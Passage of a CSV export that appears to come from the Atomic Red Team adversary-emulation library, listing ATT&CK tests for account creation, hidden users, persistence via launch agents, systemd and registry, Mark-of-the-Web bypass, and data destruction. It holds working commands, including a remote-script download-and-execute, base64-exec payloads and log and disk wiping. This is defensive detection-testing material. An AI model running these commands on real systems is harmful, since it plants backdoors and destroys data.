",linux,,,"pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
",sh,True,,"rmuser -y #{username}
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: evil_user

"
T1136.001,Create Account: Local Account,Create a user account on a MacOS system,01993ba5-1da3-4e15-a719-b690d4f0f0b2,"Creates a user on a MacOS system with dscl
",macos,,,"dscl . -create /Users/#{username}
dscl . -create /Users/#{username} UserShell /bin/zsh
dscl . -create /Users/#{username} RealName ""#{realname}""
dscl . -create /Users/#{username} UniqueID ""1010""
dscl . -create /Users/#{username} PrimaryGroupID 80
dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}
",bash,True,,"dscl . -delete /Users/#{username}
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: evil_user

input_arguments.realname.description: 'realname' to record when creating the user

input_arguments.realname.type: string

input_arguments.realname.default: Evil Account

"
T1136.001,Create Account: Local Account,Create a new user in a command prompt,6657864e-0323-4206-9344-ac9cd7265a4f,"Creates a new user in a command prompt. Upon execution, ""The command completed successfully."" will be displayed. To verify the
new account, run ""net user"" in powershell or CMD and observe that there is a new user named ""T1136.001_CMD""
",windows,,,"net user /add ""#{username}"" ""#{password}""
",command_prompt,True,,"net user /del ""#{username}"" >nul 2>&1
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: T1136.001_CMD

input_arguments.password.description: Password of the user to create

input_arguments.password.type: string

input_arguments.password.default: T1136.001_CMD!

"
T1136.001,Create Account: Local Account,Create a new user in PowerShell,bc8be0ac-475c-4fbf-9b1d-9fffd77afbde,"Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the
new account, run ""net user"" in powershell or CMD and observe that there is a new user named ""T1136.001_PowerShell""
",windows,,,"New-LocalUser -Name ""#{username}"" -NoPassword
",powershell,True,,"Remove-LocalUser -Name ""#{username}"" -ErrorAction Ignore
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: T1136.001_PowerShell

"
T1136.001,Create Account: Local Account,Create a new user in Linux with `root` UID and GID.,a1040a30-d28b-4eda-bd99-bb2861a4616c,"Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
",linux,,,"useradd -g 0 -M -d /root -s /bin/bash #{username}
if [ $(cat /etc/os-release | grep -i 'Name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi;
",bash,True,,"userdel #{username}
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: butter

input_arguments.password.description: Password of the user to create

input_arguments.password.type: string

input_arguments.password.default: BetterWithButter

"
T1136.001,Create Account: Local Account,Create a new user in FreeBSD with `root` GID.,d141afeb-d2bc-4934-8dd5-b7dba0f9f67a,"Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
",linux,,,"pw useradd #{username} -g 0 -d /root -s /bin/sh
echo ""#{password}"" | pw usermod #{username} -h 0
",sh,True,,"pw userdel #{username}
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: butter

input_arguments.password.description: Password of the user to create

input_arguments.password.type: string

input_arguments.password.default: BetterWithButter

"
T1136.001,Create Account: Local Account,Create a new Windows admin user,fda74566-a604-4581-a4cc-fbbe21d66559,"Creates a new admin user in a command prompt.
",windows,,,"net user /add ""#{username}"" ""#{password}""
net localgroup administrators ""#{username}"" /add
",command_prompt,True,,"net user /del ""#{username}"" >nul 2>&1
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: T1136.001_Admin

input_arguments.password.description: Password of the user to create

input_arguments.password.type: string

input_arguments.password.default: T1136_pass

"
T1136.001,Create Account: Local Account,Create a new Windows admin user via .NET,2170d9b5-bacd-4819-a952-da76dae0815f,"Creates a new admin user in a powershell session without using net.exe
",windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),powershell,True,,,,,
T1543.001,Create or Modify System Process: Launch Agent,Launch Agent,a5983dee-bf6c-4eaf-951c-dbc1a7b90900,"Create a plist and execute it
",macos,,,"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
",bash,True,,"sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
sudo rm ~/Library/LaunchAgents/#{plist_filename}
",bash,"dependencies.0.description: The shared library must exist on disk at specified location (#{path_malicious_plist})

dependencies.0.prereq_command: if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""The shared library doesn't exist. Check the path""; exit 1;

","input_arguments.plist_filename.description: filename

input_arguments.plist_filename.type: string

input_arguments.plist_filename.default: com.atomicredteam.plist

input_arguments.path_malicious_plist.description: Name of file to store in cron folder

input_arguments.path_malicious_plist.type: string

input_arguments.path_malicious_plist.default: $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist

"
T1543.001,Create or Modify System Process: Launch Agent,Event Monitor Daemon Persistence,11979f23-9b9d-482a-9935-6fc9cd022c3e,"This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. 
",macos,,,"sudo cp #{script_location} #{script_destination}
sudo touch /private/var/db/emondClients/#{empty_file}
",bash,True,,"sudo rm #{script_destination}
sudo rm /private/var/db/emondClients/#{empty_file}",,,"input_arguments.script_location.description: evil plist location

input_arguments.script_location.type: path

input_arguments.script_location.default: $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist

input_arguments.script_destination.description: Path where to move the evil plist

input_arguments.script_destination.type: path

input_arguments.script_destination.default: /etc/emond.d/rules/atomicredteam_T1543_001.plist

input_arguments.empty_file.description: Random name of the empty file used to trigger emond service

input_arguments.empty_file.type: string

input_arguments.empty_file.default: randomflag

"
T1543.002,Create or Modify System Process: SysV/Systemd Service,Create Systemd Service,d9e4f24f-aa67-4c6e-bcbf-85622b697a7c,"This test creates a Systemd service unit file and enables it as a service.
",linux,,,"echo ""[Unit]"" > #{systemd_service_path}/#{systemd_service_file}
echo ""Description=Atomic Red Team Systemd Service"" >> #{systemd_service_path}/#{systemd_service_file}
echo """" >> #{systemd_service_path}/#{systemd_service_file}
echo ""[Service]"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""Type=simple""
echo ""ExecStart=#{execstart_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecStartPre=#{execstartpre_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecStartPost=#{execstartpost_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecReload=#{execreload_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecStop=#{execstop_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""ExecStopPost=#{execstoppost_action}"" >> #{systemd_service_path}/#{systemd_service_file}
echo """" >> #{systemd_service_path}/#{systemd_service_file}
echo ""[Install]"" >> #{systemd_service_path}/#{systemd_service_file}
echo ""WantedBy=default.target"" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}
",bash,,,"systemctl stop #{systemd_service_file}
systemctl disable #{systemd_service_file}
rm -rf #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
",,,"input_arguments.systemd_service_path.description: Path to systemd service unit file

input_arguments.systemd_service_path.type: path

input_arguments.systemd_service_path.default: /etc/systemd/system

input_arguments.systemd_service_file.description: File name of systemd service unit file

input_arguments.systemd_service_file.type: string

input_arguments.systemd_service_file.default: art-systemd-service.service

input_arguments.execstoppost_action.description: ExecStopPost action for Systemd service

input_arguments.execstoppost_action.type: string

input_arguments.execstoppost_action.default: /bin/touch /tmp/art-systemd-execstoppost-marker

input_arguments.execreload_action.description: ExecReload action for Systemd service

input_arguments.execreload_action.type: string

input_arguments.execreload_action.default: /bin/touch /tmp/art-systemd-execreload-marker

input_arguments.execstart_action.description: ExecStart action for Systemd service

input_arguments.execstart_action.type: string

input_arguments.execstart_action.default: /bin/touch /tmp/art-systemd-execstart-marker

input_arguments.execstop_action.description: ExecStop action for Systemd service

input_arguments.execstop_action.type: string

input_arguments.execstop_action.default: /bin/touch /tmp/art-systemd-execstop-marker

input_arguments.execstartpre_action.description: ExecStartPre action for Systemd service

input_arguments.execstartpre_action.type: string

input_arguments.execstartpre_action.default: /bin/touch /tmp/art-systemd-execstartpre-marker

input_arguments.execstartpost_action.description: ExecStartPost action for Systemd service

input_arguments.execstartpost_action.type: string

input_arguments.execstartpost_action.default: /bin/touch /tmp/art-systemd-execstartpost-marker

"
T1543.002,Create or Modify System Process: SysV/Systemd Service,Create SysV Service,760fe8d2-79d9-494f-905e-a239a3df86f6,"This test creates a SysV service unit file and enables it as a service.
",linux,,,"echo '#\!/bin/sh' > #{rc_service_path}/#{rc_service_file}
echo ' ' >> #{rc_service_path}/#{rc_service_file}
echo '#' >> #{rc_service_path}/#{rc_service_file}
echo '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}
echo '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}
echo '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}
echo ' ' >> #{rc_service_path}/#{rc_service_file}
echo '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}
echo ' ' >> #{rc_service_path}/#{rc_service_file}
echo 'name=""art_test""' >> #{rc_service_path}/#{rc_service_file}
echo 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}
echo 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}
echo 'command=""/usr/bin/touch""' >> #{rc_service_path}/#{rc_service_file}
echo 'start_cmd=""art_test_start""' >> #{rc_service_path}/#{rc_service_file}
echo '' >> #{rc_service_path}/#{rc_service_file}
echo 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     
echo '{' >> #{rc_service_path}/#{rc_service_file}
echo '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}
echo '}' >> #{rc_service_path}/#{rc_service_file}
echo ' ' >> #{rc_service_path}/#{rc_service_file}     
echo 'run_rc_command ""$1""' >> #{rc_service_path}/#{rc_service_file}
chmod +x #{rc_service_path}/#{rc_service_file}
service art-test enable
service art-test start
",sh,,,"sysrc -x art_test_enable
rm -f #{rc_service_path}/#{rc_service_file}
",,,"input_arguments.rc_service_path.description: Path to rc service file

input_arguments.rc_service_path.type: path

input_arguments.rc_service_path.default: /usr/local/etc/rc.d

input_arguments.rc_service_file.description: File name of rc service file

input_arguments.rc_service_file.type: string

input_arguments.rc_service_file.default: art-test

"
T1543.002,Create or Modify System Process: SysV/Systemd Service,"Create Systemd Service file,  Enable the service , Modify and Reload the service.",c35ac4a8-19de-43af-b9f8-755da7e89c89,"This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. 
",linux,,,"cat > /etc/init.d/T1543.002 << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides : Atomic Test T1543.002
# Required-Start: $all
# Required-Stop : 
# Default-Start: 2 3 4 5
# Default-Stop: 
# Short Description: Atomic Test for Systemd Service Creation
### END INIT INFO
python3 -c ""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))""
EOF

chmod +x /etc/init.d/T1543.002
if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=""centos""') ]; then chkconfig T1543.002 on ; else echo ""Please run this test on Ubnutu , kali OR centos"" ; fi ;
systemctl enable T1543.002
systemctl start T1543.002

echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"""" | sudo tee -a /etc/init.d/T1543.002
systemctl daemon-reload
systemctl restart T1543.002
",bash,True,,"systemctl stop T1543.002
systemctl disable T1543.002
rm -rf /etc/init.d/T1543.002
systemctl daemon-reload
",,"dependencies.0.description: System must be Ubuntu ,Kali OR CentOS.

dependencies.0.prereq_command: if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=""centos""') ]; then exit /b 0; else exit /b 1; fi;

dependencies.0.get_prereq_command: echo Please run from Ubuntu ,Kali OR CentOS.

",
T1547.005,Boot or Logon Autostart Execution: Security Support Provider,Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,afdfd7e3-8a0b-409f-85f7-886fdf249c9e,"Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.
A common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/
",windows,,,"$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
Set-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\Lsa"" -Name 'Security Packages old' -Value ""$oldvalue"";
$newvalue = ""AtomicTest.dll"";
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
",powershell,True,,"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\System\CurrentControlSet\Control\Lsa"" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value ""$oldvalue"";
Remove-ItemProperty -Path  ""HKLM:\System\CurrentControlSet\Control\Lsa"" -Name 'Security Packages old';",,,
T1547.005,Boot or Logon Autostart Execution: Security Support Provider,Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,de3f8e74-3351-4fdb-a442-265dbf231738,"Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.",windows,,,"$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
Set-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig"" -Name 'Security Packages old' -Value ""$oldvalue"";
$newvalue = ""AtomicTest.dll"";
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue
",powershell,True,,"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig"" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value ""$oldvalue"";
Remove-ItemProperty -Path  ""HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig"" -Name 'Security Packages old';",,,
T1547.007,Boot or Logon Autostart Execution: Re-opened Applications,Copy in loginwindow.plist for Re-Opened Applications,5fefd767-ef54-4ac6-84d3-751ab85e8aba,"Copy in new loginwindow.plist to launch Calculator.
",macos,,,"cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
",sh,,,"rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
",,,"input_arguments.calc_plist_path.description: path to binary plist with entry to open calculator

input_arguments.calc_plist_path.type: path

input_arguments.calc_plist_path.default: PathToAtomicsFolder/T1547.007/src/reopen_loginwindow_calc.plist

"
T1547.007,Boot or Logon Autostart Execution: Re-opened Applications,Re-Opened Applications using LoginHook,5f5b71da-e03f-42e7-ac98-d63f9e0465cb,"Mac Defaults

[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)
",macos,,,"sudo defaults write com.apple.loginwindow LoginHook #{script}
",sh,True,,"sudo defaults delete com.apple.loginwindow LoginHook
",,,"input_arguments.script.description: path to script

input_arguments.script.type: path

input_arguments.script.default: /path/to/script

"
T1547.007,Boot or Logon Autostart Execution: Re-opened Applications,Append to existing loginwindow for Re-Opened Applications,766b6c3c-9353-4033-8b7e-38b309fa3a93,"Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.
Note that the change may not result in the added Calculator program launching on next user login.
It may depend on which version of macOS you are running on.
",macos,,,"FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
if [ -z ""${FILE}"" ] ; then echo ""No loginwindow plist file found"" && exit 1 ; fi
echo save backup copy to /tmp/
cp ${FILE} /tmp/t1547007_loginwindow-backup.plist
echo before
plutil -p ${FILE}
echo overwriting...
#{exe_path} ${FILE} && echo after && plutil -p ${FILE}
",sh,,,"rm -f #{exe_path}
# revert to backup copy
FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
if [ -z ""${FILE}"" ] ; then
   exit 0
fi
mv /tmp/t1547007_loginwindow-backup.plist ${FILE}
",bash,"dependencies.0.description: compile C program

dependencies.0.prereq_command: if [ -f ""#{exe_path}"" ]; then exit 0 ; else exit 1; fi

dependencies.0.get_prereq_command: cc #{objc_source_path} -o #{exe_path} -framework Cocoa

","input_arguments.objc_source_path.description: path to objective C program

input_arguments.objc_source_path.type: path

input_arguments.objc_source_path.default: PathToAtomicsFolder/T1547.007/src/append_reopen_loginwindow.m

input_arguments.exe_path.description: path to compiled program

input_arguments.exe_path.type: path

input_arguments.exe_path.default: /tmp/t1547007_append_exe

"
T1564.002,Hide Artifacts: Hidden Users,Create Hidden User using UniqueID < 500,4238a7f0-a980-4fff-98a2-dfc0a363d507,"Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)
",macos,,,"sudo dscl . -create /Users/#{user_name} UniqueID 333
",sh,True,,"sudo dscl . -delete /Users/#{user_name}
",,,"input_arguments.user_name.description: username to add

input_arguments.user_name.type: string

input_arguments.user_name.default: APT

"
T1564.002,Hide Artifacts: Hidden Users,Create Hidden User using IsHidden option,de87ed7b-52c3-43fd-9554-730f695e7f31,"Add a hidden user on macOS using IsHidden optoin
",macos,,,"sudo dscl . -create /Users/#{user_name} IsHidden 1
",sh,True,,"sudo dscl . -delete /Users/#{user_name}
",,,"input_arguments.user_name.description: username to add

input_arguments.user_name.type: string

input_arguments.user_name.default: APT

"
T1564.002,Hide Artifacts: Hidden Users,Create Hidden User in Registry,173126b7-afe4-45eb-8680-fa9f6400431c,"Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.
Reference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
",windows,,,"NET USER #{user_name}$ #{user_password} /ADD /expires:never 
REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v #{user_name}$ /t REG_DWORD /d 0
",command_prompt,True,,"reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v #{user_name}$ /f >nul 2>&1
net user ${user_name}$ /delete >nul 2>&1
",,,"input_arguments.user_password.description: Password for new user account

input_arguments.user_password.type: string

input_arguments.user_password.default: At0micRedTeam!

input_arguments.user_name.description: Username

input_arguments.user_name.type: string

input_arguments.user_name.default: AtomicOperator

"
T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,Mount ISO image,002cca30-4778-4891-878a-aaffcfa502fa,"Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/
",windows,,,"Mount-DiskImage -ImagePath ""#{path_of_iso}""
",powershell,,,"Dismount-DiskImage -ImagePath ""#{path_of_iso}"" | Out-Null
",powershell,"dependencies.0.description: T1553.005.iso must exist on disk at specified location (#{path_of_iso})

dependencies.0.prereq_command: if (Test-Path ""#{path_of_iso}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{path_of_iso}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/T1553.005.iso -OutFile ""#{path_of_iso}""

","input_arguments.path_of_iso.description: Path to ISO file

input_arguments.path_of_iso.type: path

input_arguments.path_of_iso.default: PathToAtomicsFolder\T1553.005\bin\T1553.005.iso

"
T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,Mount an ISO image and run executable from the ISO,42f22b00-0242-4afc-a61b-0da05041f9cc,"Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. 
Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing ""Hello, World!"". 
ISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",windows,,,"Mount-DiskImage -ImagePath ""#{path_of_iso}"" -StorageType ISO -Access ReadOnly
$keep = Get-Volume -FileSystemLabel ""TestIso""
$driveLetter = ($keep | Get-Volume).DriveLetter
invoke-item ""$($driveLetter):\hello.exe""
",powershell,,,"Dismount-DiskImage -ImagePath ""#{path_of_iso}"" | Out-Null
Stop-process -name ""hello"" -Force -ErrorAction ignore
",powershell,"dependencies.0.description: FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})

dependencies.0.prereq_command: if (Test-Path ""#{path_of_iso}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{path_of_iso}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile ""#{path_of_iso}""

","input_arguments.path_of_iso.description: Path to ISO file

input_arguments.path_of_iso.type: path

input_arguments.path_of_iso.default: PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso

"
T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,Remove the Zone.Identifier alternate data stream,64b12afc-18b8-4d3f-9eab-7f6cae7c73f9,"Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.
Removing this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.
",windows,,,"Unblock-File -Path #{file_path}
",powershell,,,"Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'
",powershell,"dependencies.0.description: A test file with the Zone.Identifier attribute must be present.
dependencies.0.prereq_command: if (Test-Path #{file_path}) { EXIT 0 } else { EXIT 1 }

dependencies.0.get_prereq_command: Invoke-WebRequest #{file_to_download} -OutFile #{file_path}
Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'

","input_arguments.file_to_download.description: File that will be downloaded to test against.

input_arguments.file_to_download.type: url

input_arguments.file_to_download.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md

input_arguments.file_path.description: File to have the Zone.Identifier removed.

input_arguments.file_path.type: string

input_arguments.file_path.default: $env:tmp\ReadMe.md

"
T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,Execute LNK file from ISO,c2587b8d-743d-4985-aa50-c83394eaeb68,"Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.
",windows,,,"Mount-DiskImage -ImagePath ""#{path_of_iso}"" -StorageType ISO -Access ReadOnly
$keep = Get-Volume -FileSystemLabel ""AllTheThings""
$driveLetter = ($keep | Get-Volume).DriveLetter
$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(""{c08afd90-f2a1-11d1-8455-00a0c91f3880}""))
$instance.Document.Application.ShellExecute($driveLetter+"":\document.lnk"","""",$driveLetter+"":\"",$null,0)
",powershell,,,"Dismount-DiskImage -ImagePath ""#{path_of_iso}"" | Out-Null
",powershell,"dependencies.0.description: AllTheThings.iso must exist on disk at specified location (#{path_of_iso})

dependencies.0.prereq_command: if (Test-Path ""#{path_of_iso}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{path_of_iso}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/AllTheThings.iso -OutFile ""#{path_of_iso}""

","input_arguments.path_of_iso.description: Path to ISO file

input_arguments.path_of_iso.type: path

input_arguments.path_of_iso.default: PathToAtomicsFolder\T1553.005\bin\AllTheThings.iso

"
T1485,Data Destruction,Windows - Overwrite file with SysInternals SDelete,476419b5-aebf-4366-a131-ae3e8dae5fc2,"Overwrites and deletes a file using SysInternals SDelete. Upon successful execution, ""Files deleted: 1"" will be displayed in
the powershell session along with other information about the file that was deleted.
",windows,,,"if (-not (Test-Path ""#{file_to_delete}"")) { New-Item ""#{file_to_delete}"" -Force }
& ""#{sdelete_exe}"" -accepteula ""#{file_to_delete}""
",powershell,,,,powershell,"dependencies.0.description: Secure delete tool from SysInternals must exist on disk at specified location (#{sdelete_exe})

dependencies.0.prereq_command: if (Test-Path ""#{sdelete_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/SDelete.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\SDelete.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\SDelete.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Sdelete"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\SDelete.zip"" -Force

","input_arguments.sdelete_exe.description: Path of sdelete executable

input_arguments.sdelete_exe.type: path

input_arguments.sdelete_exe.default: PathToAtomicsFolder\..\ExternalPayloads\Sdelete\sdelete.exe

input_arguments.file_to_delete.description: Path of file to delete

input_arguments.file_to_delete.type: path

input_arguments.file_to_delete.default: PathToAtomicsFolder\..\ExternalPayloads\T1485.txt

"
T1485,Data Destruction,FreeBSD/macOS/Linux - Overwrite file with DD,38deee99-fd65-4031-bec8-bfa4f9f26146,"Overwrites and deletes a file using DD.
To stop the test, break the command with CTRL/CMD+C.
",linux,macos,,"dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes
",sh,,,,,,"input_arguments.overwrite_source.description: Path of data source to overwrite with

input_arguments.overwrite_source.type: path

input_arguments.overwrite_source.default: /dev/zero

input_arguments.file_to_overwrite.description: Path of file to overwrite and remove

input_arguments.file_to_overwrite.type: path

input_arguments.file_to_overwrite.default: /var/log/syslog

"
T1485,Data Destruction,Overwrite deleted data on C drive,321fd25e-0007-417f-adec-33232252be19,"RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.
This process is very slow and test execution may timeout. 
https://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware
https://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4
",windows,,,"cipher.exe /w:C:
",command_prompt,,,,,,
T1485,Data Destruction,GCP - Delete Bucket,4ac71389-40f4-448a-b73f-754346b3f928,"This Atomic will create a Google Storage Bucket then delete it. The idea for this Atomic came from a Rule published by the Elastic team.

Identifies when a Google Cloud Platform (GCP) storage bucket is deleted. An adversary may delete a storage bucket in order to disrupt their target's business operations.
This atomic will create a bucket then delete the bucket.

Reference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml
",iaas:gcp,,,"gcloud config set project #{project_id}
gcloud storage buckets delete gs://#{bucket_name}
",sh,False,,"cd ""$PathToAtomicsFolder/T1485/src/T1485-4/""
terraform state rm google_storage_bucket.bucket
terraform destroy -auto-approve
",sh,"dependencies.0.description: Requires gcloud

dependencies.0.prereq_command: if [ -x ""$(command -v gcloud)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install""

dependencies.1.description: Check if user is logged in 

dependencies.1.prereq_command: gcloud config get-value account

dependencies.1.get_prereq_command: gcloud auth login --no-launch-browser

dependencies.2.description: Check if terraform is installed.

dependencies.2.prereq_command: terraform version

dependencies.2.get_prereq_command: echo Please install the terraform.

dependencies.3.description: Create dependency resources using terraform

